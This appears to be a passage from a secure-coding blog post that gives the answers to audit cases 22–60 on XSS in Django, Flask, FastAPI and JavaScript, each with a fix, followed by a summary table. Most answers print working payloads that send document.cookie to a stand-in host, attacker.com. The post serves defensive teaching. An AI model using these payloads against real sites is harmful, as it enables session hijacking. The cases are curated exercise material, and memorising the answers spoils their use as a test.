            notbar.appendChild(p);
        });
    </script>
</body>
</html>
```

---

### Case 22 — Answer

1. Reflected XSS. Missing escaping. Remove the `safe` filter: it tells Jinja2 that there is no need for HTML Escaping — leaving the frontend vulnerable to XSS. Argument for `username` should be a parameter for the format string in `format_html()`. This will ensure proper escaping.

2. Payload for `user`:

```
/?user=<script>fetch('https://attacker.com?q='+document.cookie);</script>
```

3. Fix:

```python
# views.py
from django.shortcuts import render
from django.utils.html import format_html

def user_badge(request):
    username = request.GET.get("user", "guest")
    role = request.GET.get("role", "viewer")
    badge = format_html(
        "<span class='badge'>{}</span> logged in as {}",
        role,
        username
    )
    return render(request, "badge.html", {"badge": badge})
```

```html
<!-- badge.html -->
<html>
<body>
    <div id="header">
        {{ badge }}
    </div>
</body>
</html>
```

---

### Case 23 — Answer

1. Stored XSS since the payload is stored in-memory on server and later sent to frontend in `/reviews` handler. Misplaced escaping.

2. Payload:

```
POST /review
Content-Type: application/json

{"text": "</li><script>fetch('https://attacker.com/?q='+document.cookie);</script><li>"}
```

3. Fix:

```python
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

reviews = []

@app.post("/review")
async def add_review(request: Request):
    body = await request.json()
    reviews.append(body.get("text", ""))
    return {"status": "saved"}

@app.get("/reviews")
async def view_reviews(request: Request):
    return templates.TemplateResponse(
        "reviews.html", {"request": request, "reviews": reviews}
    )
```

```html
<!-- templates/reviews.html -->
<html>
<body>
    <h2>Customer Reviews</h2>
    <ul>
        {% for review in reviews %}
            <li>{{ review }}</li>
        {% endfor %}
    </ul>
</body>
</html>
```

---

### Case 24 — Answer

1. Reflected XSS. Missing Escaping. `mark_safe()` tells Django to not escape its arguments.

2. Payload:

```
/?q="><img src=x onerror="fetch('https://attacker.com?q='+document.cookie)"
```

3. Fix:

```python
# views.py
from django.shortcuts import render

def search(request):
    query = request.GET.get("q", "")
    return render(request, "search.html", {"query": query})
```

```html
<!-- search.html -->
<html>
<body>
    <h1>Search</h1>
    <form method="GET" action="/search">
        <input type="text" name="q" value="{{ query }}">
        <button type="submit">Search</button>
    </form>
</body>
</html>
```

---

### Case 25 — Answer

1. DOM XSS. Missing escaping. `innerHTML` must be replaced with `textContent`.

2. Payload:

```
/?page=</h2><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><h2>
```

3. Fix:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Welcome</h1>
    <div id="content">Loading your page...</div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const page = params.get("page") || "Home";
        document.title = page;
        const content = document.getElementById('content');
        const h2 = document.createElement('h2');
        h2.textContent = "You are viewing: " + page;
        content.appendChild(h2);
    </script>
</body>
</html>
```

---

### Case 26 — Answer

1. Reflected XSS. Wrong context Escaping. The `escape()` marks the parameter as safe for HTML execution, which is risky. We must escape javascript since user input is rendered inside a Javascript `<script>` element on the frontend.

2. Once the escaping in the backend is removed the following payload will work:

```
POST /login
Content-Type: application/x-www-form-urlencoded

username=";fetch('https://attacker.com/?q='+document.cookie);//
```

3. Fix:

```python
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    if not username or not password:
        error = "Error: username and password are required."
        return render_template("login.html", error=error)

    if username != "admin" or password != "secret":
        error = f"Error: invalid credentials for user {username}."
        return render_template("login.html", error=error)

    return "Welcome!"
```

```html
<!-- templates/login.html -->
<html>
<body>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
    {% if error %}
        <script>
            alert({{ error | tojson }});
        </script>
    {% endif %}
</body>
</html>
```

---

### Case 27 — Answer

1. Reflected XSS. Missing escaping. `mark_safe()` marks the input safe for HTML execution, which leaves `query` an attack vector for XSS. Remove `mark_safe()` since it marks input as safe for HTML execution, which leaves an attack vector for XSS.

2. Payload:

```
/?q=</strong><script>fetch('https://attacker.com/?q='+document.cookie);</script><strong>
```

3. Fix:

```python
# views.py
from django.shortcuts import render
from django.utils.html import format_html

def search_results(request):
    query = request.GET.get("q", "")
    results = ["Result 1", "Result 2", "Result 3"]

    summary = format_html("<p>Showing results for: <strong>{}</strong></p>", query)

    return render(request, "results.html", {
        "summary": summary,
        "results": results,
    })
```

```html
<!-- results.html -->
<html>
<body>
    <h1>Search Results</h1>
    {{ summary }}
    <ul>
    {% for result in results %}
        <li>{{ result }}</li>
    {% endfor %}
    </ul>
</body>
</html>
```

---

### Case 28 — Answer

1.
- A. Reflected XSS for `username` variable. Misplaced Escaping. There is no need for `escape()` call in the backend. HTML autoescaping takes place in the template automatically.
- B. Wrong context escaping for `theme`. The `theme` in the template must be wrapped in double quotes for proper escaping of the HTML attribute.

2. Payload for `username` once the `escape()` call is removed from the backend:

```
/?username=</h1><script>fetch('https://attacker.com/?q='+document.cookie);</script>
```

Payload for `theme`:

```
?theme=x onmouseover=fetch('https://attacker.com?q='+document.cookie)
```

3. Fix:

```python
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/profile")
def profile(request: Request, username: str = "guest", theme: str = "light"):
    return templates.TemplateResponse("profile.html", {
        "request": request,
        "username": username,
        "theme": theme,
    })
```

```html
<!-- templates/profile.html -->
<html>
<body>
    <div class="{{ theme }}">
        <h1>Welcome, {{ username }}!</h1>
        <p>Your profile is loading...</p>
    </div>
</body>
</html>
```

---

### Case 29 — Answer

1. DOM XSS. Wrong context escaping. No need for `encodeURIComponent()` call in frontend. The `innerHTML` should be replaced with `textContent`.

2. Sample payload:

```
</p><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><p>
```

3. Fix:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Support Chat</title>
</head>
<body>
    <h1>Live Support</h1>
    <div id="chat-log"></div>
    <input type="text" id="msg-input" placeholder="Type a message...">
    <button onclick="sendMessage()">Send</button>

    <script>
        const chatLog = document.getElementById("chat-log");

        function sendMessage() {
            const input = document.getElementById("msg-input");
            const msg = input.value;
            const p = document.createElement('p');
            const strong = document.createElement('strong');
            strong.textContent = "You:";
            p.appendChild(strong);
            p.appendChild(document.createTextNode(' ' + msg));
            chatLog.appendChild(p);
            input.value = "";
        }
    </script>
</body>
</html>
```

---

### Case 30 — Answer

1. DOM XSS. Missing escaping.

2. Sample payload:

```
<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Fix:

```javascript
// components/CommentFeed.jsx
{comments.map((comment, i) => (
    <li
        key={i}
        ref={el => el && (el.textContent = comment)}
    />
))}
```

---

### Case 31 — Answer

1. Reflected XSS. Wrong context escaping. Javascript escaping required.

2. Sample payload:

```
/?msg=</p><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><p>
```

3. Fix:

```html
<!-- dashboard.html -->
<html>
<head>
    <script>
        function showBanner(msg) {
            const banner = document.getElementById("banner");
            const p = document.createElement('p');
            p.textContent = `Notification: ${msg}`;
            banner.appendChild(p);
        }
    </script>
</head>
<body>
    <div id="banner"></div>
    <h1>Dashboard</h1>
    <script>
        showBanner("{{ msg|escapejs }}");
    </script>
</body>
</html>
```

---

### Case 32 — Answer

1. Reflected XSS. Missing HTML escaping for:

```
<p>Your language preference: {lang}</p>
```

And missing HTML escaping for the href tag in:

```
<p>Visit our <a href="/help?lang={lang}">help page</a>.</p>
```

2. Payload targeting the href:

```
/?lang=" onclick="fetch('https://attacker.com/?'+document.cookie)
```

Payload targeting the `<p>` tag:

```
/?lang=</p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
```

3. Fix:

```python
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

templates = Jinja2Templates(directory="templates")
app = FastAPI()

@app.get("/settings")
def settings(request: Request, lang: str = "en"):
    return templates.TemplateResponse("lang.html", {"request": request, "lang": lang})
```

```html
<!--lang.html-->
<html>
<body>
    <h1>Settings</h1>
    <p>Your language preference: {{lang}}</p>
    <p>Visit our <a href="/help?lang={{lang}}">help page</a>.</p>
</body>
</html>
```

---

### Case 33 — Answer

1. Stored XSS. Misplaced Escaping.

2. Payload:

```
POST /activity
Content-Type: application/json

{"action": "<img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\">"}
```

3. Fix:

```python
# app.py
from flask import Flask, request, jsonify

app = Flask(__name__)

activity_feed = []

@app.route("/activity", methods=["POST"])
def add_activity():
    data = request.get_json()
    action = data.get("action", "")
    activity_feed.append(action)
    return jsonify({"status": "saved"})

@app.route("/feed")
def feed():
    return jsonify({"feed": activity_feed})
```

```html
<!-- feed.html -->
<script>
    fetch("/feed")
        .then(res => res.json())
        .then(data => {
            data.feed.forEach(item => {
                const feed = document.getElementById("feed");
                const p = document.createElement('p');
                p.textContent = `${item}`;
                feed.appendChild(p);
            });
        });
</script>
```

---

### Case 34 — Answer

1. No vulnerabilities. But the code is unclean. Better code is presented in (3.)

2. No payloads.

3. Fix:

```python
# views.py
from django.shortcuts import render
from .models import Report

def search(request):
    query = request.GET.get("q", "")
    results = Report.objects.filter(title__icontains=query)
    return render(request, "title.html", {
        "query": query,
        "results": results,
    })
```

```html
<!--title.html-->
<html>
<body>
  <h2>Results for: {{ query }}</h2>
  <ul>
    {% for result in results %}
      <li>{{ result.title }}</li>
    {% endfor %}
  </ul>
</body>
</html>
```

---

### Case 35 — Answer

1. DOM XSS. Missing escaping.

2. Sample payload:

```
</li><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><li>
```

3. Fix:

```html
<script>
    input.addEventListener("input", () => {
        const query = input.value;
        fetch(`/api/suggestions?q=${query}`)
            .then(res => res.json())
            .then(data => {
                data.results.forEach(item => {
                    const li = document.createElement('li');
                    li.className = 'suggestion';
                    li.textContent = `${item.name}`;
                    suggestions.appendChild(li);
                });
            });
    });
</script>
```

---

### Case 36 — Answer

1. DOM XSS. Missing Escaping.

2. Sample payload:

```
POST /api/profile/attacker
Content-Type: application/json

{"bio": "<img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\">"}
```

3. Fix:

```javascript
useEffect(() => {
    if (profile && bioRef.current) {
        bioRef.current.textContent = profile.bio;
    }
}, [profile]);
```

---

### Case 37 — Answer

1. Stored XSS. Missing escaping.

2. Sample payload:

```
POST /ticket
Content-Type: application/x-www-form-urlencoded

title=attacker&body=</div><script>fetch('https://attacker.com/?q='+document.cookie);</script><div>
```

3. Fix:

```html
<!-- tickets.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Support Tickets</h1>
    {% for ticket in tickets %}
        <div class="ticket">
            <h2>{{ ticket.title }}</h2>
            <div class="body">{{ ticket.body }}</div>
        </div>
    {% endfor %}
</body>
</html>
```

---

### Case 38 — Answer

1. Reflected XSS. Wrong Context Escaping.

2. Sample payload:

```
POST /
Content-Type: application/x-www-form-urlencoded

email=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Fix:

```python
# views.py
from django.shortcuts import render

def preferences(request):
    saved = False
    email = request.POST.get("email", "")
    if request.method == "POST":
        saved = True
    return render(request, "preferences.html", {
        "email": email,
        "saved": saved,
    })
```

```html
<!-- preferences.html -->
<head>
    <script>
        function showConfirmation(email) {
            const banner = document.getElementById("confirmation");
            banner.textContent = `Preferences saved for: ${email}`;
        }
    </script>
</head>
<body>
    {% if saved %}
        <div id="confirmation"></div>
        <script>
            showConfirmation("{{ email | escapejs }}");
        </script>
    {% endif %}
</body>
```

---

### Case 39 — Answer

1. Stored XSS. Misplaced Escaping. Although escaping is applied in the backend this can cause display issues.

2. No serious XSS vulnerability but display issues.

3. Fix:

```python
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

templates = Jinja2Templates(directory="templates")
app = FastAPI()

@app.post("/comment")
async def add_comment(request: Request):
    data = await request.json()
    author = data.get("author", "")
    text = data.get("text", "")
    conn = get_db()
    conn.execute(
        "INSERT INTO comments (author, text) VALUES (?, ?)",
        (author, text)
    )
    conn.commit()
    conn.close()
    return {"status": "saved"}

@app.get("/comments")
async def view_comments(request: Request):
    conn = get_db()
    rows_data = conn.execute("SELECT author, text FROM comments").fetchall()
    conn.close()
    return templates.TemplateResponse("rows.html", {
        "request": request,
        "rows_data": rows_data
    })
```

```html
<!--rows.html-->
<table>
    <thead><tr><th>Author</th><th>Comment</th></tr></thead>
    <tbody>
        {% for c in rows_data %}
        <tr>
            <td>{{ c.author }}</td>
            <td>{{ c.text }}</td>
        </tr>
        {% endfor %}
    </tbody>
</table>
```

---

### Case 40 — Answer

1. Stored XSS. Wrong Context escaping.

2. Sample payload:

```
POST /review
Content-Type: application/x-www-form-urlencoded

username=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">&review=x
```

3. Fix:

```html
<!-- reviews.html -->
<head>
    <script>
        function highlightUser(username) {
            document.getElementById("welcome").textContent =
                `Welcome back, ${username}!`;
        }
    </script>
</head>
<body>
    {% for review in reviews %}
        <div class="review">
            <strong>{{ review.username }}</strong>
            <p>{{ review.review }}</p>
            <script>highlightUser({{ review.username | tojson }});</script>
        </div>
    {% endfor %}
</body>
```

---

### Case 41 — Answer

1. Stored XSS. Missing Escaping.

2. SQL row entry payload:

```
user.username: attacker
user.bio: </div><script>fetch('https://attacker.com/?q='+document.cookie);</script><div>
```

3. Fix:

```html
<!-- profile.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>{{ user.username }}'s Profile</h1>
    <div class="bio">{{ user.bio }}</div>
</body>
</html>
```

---

### Case 42 — Answer

1. Technically the code does succeed in defending against XSS but it can cause display errors.

2. No relevant payload. Just issues with display errors.

3. Fix:

```python
@app.route("/event", methods=["POST"])
def add_event():
    title = request.form.get("title", "")
    description = request.form.get("description", "")
    conn = get_db()
    conn.execute(
        "INSERT INTO events (title, description) VALUES (?, ?)",
        (title, description)
    )
    conn.commit()
    conn.close()
    return "Event added."
```

---

### Case 43 — Answer

1. Stored XSS. Missing Escaping.

2. Sample payload:

```
POST /
Content-Type: application/x-www-form-urlencoded

body=</p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>&author=x
```

3. Fix:

```html
<!-- forum.html -->
{% for post in posts %}
    <div class="post">
        <strong>{{ post.author }}</strong>
        <p>{{ post.body }}</p>
    </div>
{% endfor %}
```

---

### Case 44 — Answer

1. Stored XSS. Missing Escaping.

2. Sample payload:

```
POST /comment
Content-Type: application/json

{"author": "</strong><strong>", "body": "</p><img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\"><p>"}
```

3. Fix:

```html
<!-- comments.html -->
<script>
    function renderComment(author, body) {
        const div = document.createElement('div');
        const strong = document.createElement('strong');
        strong.textContent = `${author}`;
        const p = document.createElement('p');
        p.textContent = `${body}`;
        div.appendChild(strong);
        div.appendChild(p);
        document.getElementById("comments").appendChild(div);
    }
</script>
```

---

### Case 45 — Answer

1. Reflected XSS. Wrong context escaping.

2. Sample payload:

```
/?user=") ; fetch('https://attacker.com/?q='+document.cookie);//
```

3. Fix:

```html
<!-- dashboard.html -->
<script>
    initDashboard({{ username | tojson }}, {{ role | tojson }});
</script>
```

---

### Case 46 — Answer

1. DOM XSS. Missing escaping.

2. Sample payload:

```
msg.author: ""
msg.text: "<img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\">"
```

3. Fix:

```javascript
data.messages.forEach(msg => {
    const div = document.createElement("div");
    div.textContent = `${msg.author}: ${msg.text}`;
    chatWindow.appendChild(div);
});
```

---

### Case 47 — Answer

1. Reflected XSS. Wrong context escaping.

2. Sample payload:

```
?q="); fetch('https://attacker.com/?q='+document.cookie); //
```

3. Fix:

```python
return render(request, "search.html", {
    "query": query,
    "results": results,
})
```

```html
<script>
    trackSearch("{{ query | escapejs }}");
</script>
```

---

### Case 48 — Answer

1. Stored XSS. Missing escaping.

2. Sample payload:

```
POST /article
Content-Type: application/json

{
    "title": "</h2><h2>",
    "summary": "</p><p>",
    "author": "attacker</small><img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\"><small>"
}
```

3. Fix:

```javascript
function loadArticle(title, summary, author) {
    const container = document.getElementById("article-view");
    const h2 = document.createElement('h2');
    const p = document.createElement('p');
    const small = document.createElement('small');
    h2.textContent = `${title}`;
    p.textContent = `${summary}`;
    small.textContent = `By ${author}`;
    container.appendChild(h2);
    container.appendChild(p);
    container.appendChild(small);
}
```

---

### Case 49 — Answer

1. No vulnerability. Just display issues.

2. No relevant payload.

3. Fix:

```python
messages = [row['message'] for row in rows]
conn.close()
return render(request, "notifications.html", {"messages": messages})
```

---

### Case 50 — Answer

1. Reflected XSS. Missing Escaping.

2. Sample payload:

```
/?filter='); fetch('https://attacker.com/?q='+document.cookie)
```

3. Fix:

```html
<button onclick="applyFilter({{ filter | tojson }})">Refresh Filter</button>
```

---

### Case 51 — Answer

1. DOM XSS. Missing escaping.

2. Sample payload:

```json
{
    "employees": [
        {
            "id": 1,
            "name": "</h3><img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\"><h3>",
            "role": "</p><img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\"><p>",
            "email": "attacker@attacker.com\" onclick=\"fetch('https://attacker.com/?q='+document.cookie)\""
        }
    ]
}
```

3. Fix:

```javascript
data.employees.forEach(emp => {
    const card = document.createElement("div");
    card.setAttribute("data-id", emp.id);
    const name = document.createElement('h3');
    name.textContent = `${emp.name}`;
    const role = document.createElement('p');
    role.textContent = `${emp.role}`;
    const email = document.createElement('p');
    email.textContent = `Email: ${emp.email}`;
    card.appendChild(name);
    card.appendChild(role);
    card.appendChild(email);
    results.appendChild(card);
});
```

---

### Case 52 — Answer

1. Stored XSS. Missing Escaping.

2. Sample payload for SQL entry row:

```
ticket-subject: <img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
ticket-message: <img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Fix:

```javascript
function showTicket(id, subject, message, status) {
    document.getElementById("ticket-id").textContent = id;
    document.getElementById("ticket-subject").textContent = subject;
    document.getElementById("ticket-message").textContent = message;
    document.getElementById("ticket-status").textContent = status;
}
```

---

### Case 53 — Answer

1. There is no XSS bug here. Only display issues.

2. No relevant payload.

3. Fix:

```python
@app.post("/ticket")
async def submit_ticket(request: Request):
    data = await request.json()
    name = data.get("name", "")
    issue = data.get("issue", "")
    conn = get_db()
    conn.execute(
        "INSERT INTO tickets (name, issue) VALUES (?, ?)",
        (name, issue)
    )
    conn.commit()
    conn.close()
    return {"status": "submitted"}
```

---

### Case 54 — Answer

1. Stored XSS. Wrong context escaping. Stored XSS in Javascript string context inside `onclick`. There is also a Stored XSS in innerHTML DOM sink.

2. Payload for `note.title` via innerHTML sink:

```
note.title: </h2><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"<h2>
note.body: </p><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"<p>
```

Payload for `note.title` via onclick breakout:

```
note.title: '); fetch('https://attacker.com/?q='+document.cookie);//
```

3. Fix:

```html
<!-- notes.html -->
<ul>
{% for note in notes %}
    <li onclick="showNote({{ note.title | tojson }}, {{ note.body | tojson }})">
        {{ note.title }}
    </li>
{% endfor %}
</ul>

<script>
    function showNote(title, body) {
        const notedisplay = document.getElementById("note-display");
        const t = document.createElement('h2');
        t.textContent = title;
        const b = document.createElement('p');
        b.textContent = body;
        notedisplay.appendChild(t);
        notedisplay.appendChild(b);
    }
</script>
```

---

### Case 55 — Answer

1. Stored XSS. Missing escaping.

2. Sample payload:

```
POST /comment

author=</strong><script>fetch('https://attacker.com/?q='+document.cookie);</script><strong>&body=</p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
```

3. Fix:

```python
# app.py
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

comments = []

@app.route("/comment", methods=["POST"])
def post_comment():
    author = request.form.get("author", "")
    body = request.form.get("body", "")
    comments.append({
        "author": escape(author),
        "body": escape(body),
    })
    return "Comment posted."

@app.route("/comments")
def view_comments():
    return render_template("comments.html", comments=comments)
```

---

### Case 56 — Answer

1. Stored XSS. Missing escaping.

2. Sample payload:

```
post.body: </div><script>fetch('https://attacker.com/?q='+document.cookie);</script><div>
```

3. Fix:

```html
<!-- posts.html -->
{% for post in posts %}
    <div class="post">
        <h2>{{ post.title }}</h2>
        <div class="body">{{ post.body }}</div>
    </div>
{% endfor %}
```

---

### Case 57 — Answer

1. Stored XSS. Missing escaping.

2. Sample payload:

```
review.author: </strong><script>fetch('https://attacker.com/?q='+document.cookie);</script><strong>
review.body: </p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
```

3. Fix:

```python
# views.py
from django.shortcuts import render
from .models import Review

def review_list(request):
    reviews = Review.objects.all()
    processed = []
    for review in reviews:
        processed.append({
            "author": review.author,
            "stars": review.stars,
            "body": review.body,
        })
    return render(request, "reviews.html", {"reviews": processed})
```

---

### Case 58 — Answer

1. Stored XSS. Missing escaping.

2. Sample payload:

```
item.title: </h2><script>fetch('https://attacker.com/?q='+document.cookie);</script><h2>
item.body: </p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
item.author: attacker</small><script>fetch('https://attacker.com/?q='+document.cookie);</script><small>
```

3. Fix:

```html
<!-- announcements.html -->
{% for item in items %}
    <div class="announcement">
        <h2>{{ item.title }}</h2>
        <p>{{ item.body }}</p>
        <small>Posted by: {{ item.author }}</small>
    </div>
{% endfor %}
```

---

### Case 59 — Answer

1. Stored XSS. Wrong context escaping. Must do Javascript context escaping for the `badge`.

2. Sample payload:

```
badge: <script>fetch('https://attacker.com?q='+document.cookie);</script>
```

3. Fix:

```python
# views.py
from django.shortcuts import render
from .models import Product

def product_detail(request, product_id):
    product = Product.objects.get(id=product_id)
    return render(request, "product.html", {
        "product": product
    })
```

```html
<!-- product.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>{{ product.name }}</h1>
    <p>{{ product.description }}</p>
    <div class="badge">{{ product.badge_html }}</div>
</body>
</html>
```

---

### Case 60 — Answer

1. Stored XSS. Missing Escaping.

2. Sample payload:

```
comment.author: </strong><script>fetch('https://attacker.com/?q='+document.cookie);</script><strong>
```

3. Fix:

```python
# views.py
from django.shortcuts import render
from .models import Comment

def comment_list(request):
    comments = Comment.objects.all()

    return render(request, "comments.html", {
        "comments": comments
    })
```

```html
<!-- comments.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Comments</h1>
    {% for comment in comments %}
        <div class="comment"><strong>{{ comment.author }}</strong>{{ comment.body }}
    {% endfor %}
</body>
</html>
```

---

## Summary Table: All 60 Cases

| Case | Framework | XSS Type | Bug Type | Attack Context | Fix Applied |
|---|---|---|---|---|---|
| 1 | Django | Reflected | Missing (autoescaping bypassed by `\| safe`) | HTML body | Remove `\| safe` |
| 2 | Django | Reflected | Wrong context | JS string in `<script>` | `\| escapejs` in template |
| 3 | Django | Stored | Misplaced | HTML body | Store raw; remove `escape()` + `mark_safe()` |
| 4 | Flask | Reflected | Missing + SSTI | HTML body | Replace `render_template_string()` + `%s` |
| 5 | Flask | Reflected | Wrong context | `href` attribute | URL scheme validation |
| 6 | Flask | None | Display only | — | Remove `html.escape()` (double-escape) |
| 7 | FastAPI | Reflected | Missing | HTML body | Replace `HTMLResponse` f-string with `Jinja2Templates` |
| 8 | FastAPI + JS | DOM | Missing | `innerHTML` sink | Replace with `textContent` |
| 9 | FastAPI + React | DOM | Wrong context | `innerHTML` sink (React ref) | Remove server escape; `textContent` |
| 10 | Vanilla JS | DOM | Missing | `innerHTML` sink | Replace with `textContent` |
| 11 | React | DOM | Missing | `innerHTML` in custom hook | Replace with `textContent` |
| 12 | Vanilla JS | DOM | Wrong context | `innerHTML` sink | Remove `encodeURIComponent`; `createElement` + `textContent` |
| 13 | Django | Stored | Missing (`{% autoescape off %}`) | HTML body | Remove `{% autoescape off %}` block |
| 14 | Flask | Reflected | Missing (`Markup()`) | HTML body | Remove `Markup()`; store raw |
| 15 | FastAPI | Reflected | Missing | JS variable in `<script>` | `\| tojson` filter |
| 16 | Django | Reflected | Wrong context | Unquoted HTML attribute | Add quotes around `{{ css_class }}` |
| 17 | Flask | Stored | Misplaced | HTML body | Store raw; remove `escape()` + `\| safe` |
| 18 | Vanilla JS | DOM | Missing | `innerHTML` sink (hash source) | `createElement` + `textContent` |
| 19 | React | DOM | Missing | `innerHTML` sink | Replace with `textContent` |
| 20 | Flask | Reflected | Wrong context | `href` attribute | URL scheme validation |
| 21 | Vanilla JS | DOM | Missing | `innerHTML` sink (postMessage source) | `createElement` + `textContent` |
| 22 | Django | Reflected | Missing | HTML body + `\| safe` | Pass `username` as `{}` arg; remove `\| safe` |
| 23 | FastAPI | Stored | Misplaced | HTML body | Store raw; remove `escape()` + `\| safe` |
| 24 | Django | Reflected | Missing (`mark_safe()`) | HTML attribute | Remove `mark_safe()` |
| 25 | Vanilla JS | DOM | Missing | `innerHTML` sink | `createElement` + `textContent` |
| 26 | Flask | Reflected | Wrong context | JS string in `alert()` | Remove `escape()`; `\| tojson` |
| 27 | Django | Reflected | Missing (`mark_safe()`) | HTML body | `format_html()` with `{}` args |
| 28 | FastAPI | Reflected | Misplaced (A) + Wrong context (B) | HTML body + unquoted attribute | Remove `escape()`; add quotes |
| 29 | Vanilla JS | DOM | Wrong context | `innerHTML` sink | Remove `encodeURIComponent`; `createElement` + `textContent` |
| 30 | React | DOM | Missing | `innerHTML` via ref callback | Replace with `textContent` |
| 31 | Django | Reflected | Wrong context (two layers) | JS string + `innerHTML` sink | `\| escapejs` + `textContent` (both required) |
| 32 | FastAPI | Reflected | Missing | HTML body + `href` attribute | Replace f-string with `Jinja2Templates` |
| 33 | Flask + JS | Stored | Misplaced | `innerHTML` sink | Store raw; `createElement` + `textContent` |
| 34 | Django | None | None | — | Code correct; template refactor optional |
| 35 | Vanilla JS | DOM | Missing | `insertAdjacentHTML` sink | `createElement` + `textContent` |
| 36 | React | DOM | Missing | `innerHTML` sink | Replace with `textContent` |
| 37 | Flask | Stored | Missing (`{% autoescape off %}`) | HTML body | Remove `{% autoescape off %}` |
| 38 | Django | Reflected | Wrong context | JS string + `innerHTML` sink | Remove `escape()`; `\| escapejs` + `textContent` |
| 39 | FastAPI | Stored | Misplaced | HTML body (f-string HTML) | Store raw; use `Jinja2Templates` |
| 40 | Flask | Stored | Wrong context | JS string in `<script>` | `\| tojson`; `textContent` |
| 41 | Django | Stored | Missing (`\| safe`) | HTML body | Remove `\| safe` |
| 42 | Flask | None | Display only | — | Remove `escape()` at storage |
| 43 | Django | Stored | Missing (`\| safe`) | HTML body | Remove `\| safe` |
| 44 | FastAPI | Stored | Missing | `innerHTML` sink inside JS function | `createElement` + `textContent` in `renderComment()` |
| 45 | Flask | Reflected | Wrong context | JS string arguments | `\| tojson` for both values |
| 46 | Vanilla JS | DOM | Missing | `innerHTML` sink | Replace with `textContent` |
| 47 | Django | Reflected | Wrong context | JS string in `<script>` | Remove `escape()`; `\| escapejs` |
| 48 | FastAPI | Stored | Missing | `innerHTML` sink inside JS function | `createElement` + `textContent` in `loadArticle()` |
| 49 | Django | None | Display only | — | Remove `escape()` |
| 50 | Flask | Reflected | Missing | JS string in `onclick` attribute | `\| tojson` |
| 51 | Vanilla JS | DOM | Missing | Template literal `innerHTML` | `createElement` + `textContent` |
| 52 | Flask | Stored | Missing | `innerHTML` sinks in JS function | Replace with `textContent` |
| 53 | FastAPI | None | Display only | — | Remove `escape()` + `str()` |
| 54 | FastAPI | Stored | Wrong context (A) + Missing (B) | JS string `onclick` + `innerHTML` sink | `\| tojson` + `createElement` + `textContent` |
| 55 | Flask | Stored | Missing (`Markup()`) | HTML body | Remove `Markup()`; store raw |
| 56 | Flask | Stored | Missing (`\| safe`) | HTML body | Remove `\| safe` |
| 57 | Django | Stored | Missing (`mark_safe()`) | HTML body | Remove `mark_safe()` |
| 58 | Django | Stored | Missing (`{% autoescape off %}`) | HTML body | Remove `{% autoescape off %}` block |
| 59 | Django | Stored | Missing (`format_html()` no-arg misuse) | HTML body | Remove `format_html()`; use `{{ product.badge_html }}` |
| 60 | Django | Stored | Missing (`format_html()` + f-string) | HTML body | Remove f-string; pass both fields as `{}` args |

---

*This blog post is part of an ongoing series on web application security. The secure coding exercises and audit cases are contributed to the P2P open source project for curating high-quality secure code training datasets. References: OWASP XSS Prevention Cheat Sheet; Dennis Byrne, Full Stack Python Security (Manning, 2022); Jonathan Johansen et al., Secure by Design (Manning, 2019).*

---

## Before You Go — Two Quick Things

**1. ⭐ Star the repo**

All 60 of these cases, plus challenges covering SQL injection, authentication, API security, and more, live in [SecEng-Exercises on GitHub](https://github.com/fosres/SecEng-Exercises). The project's goal is to build a high-quality, open dataset of secure coding exercises that can be used to train AI models to write *less* vulnerable code — addressing the core problem that today's models learned from billions of lines of public code, including a lot of vulnerable patterns. If you got anything out of this post, a star costs you one click and helps the project get discovered by other developers and security engineers who'd benefit from it.

**2. 📊 Take the 30-second poll**

I'm running a poll to understand what the security community thinks is the most dangerous XSS escaping mistake in production code today. Your answer will directly shape which vulnerability classes I prioritize in future challenge sets.

👉 **[Cast your vote here](https://strawpoll.com/wby5QoKAkyA)**

Results will be shared in the next post in this series.
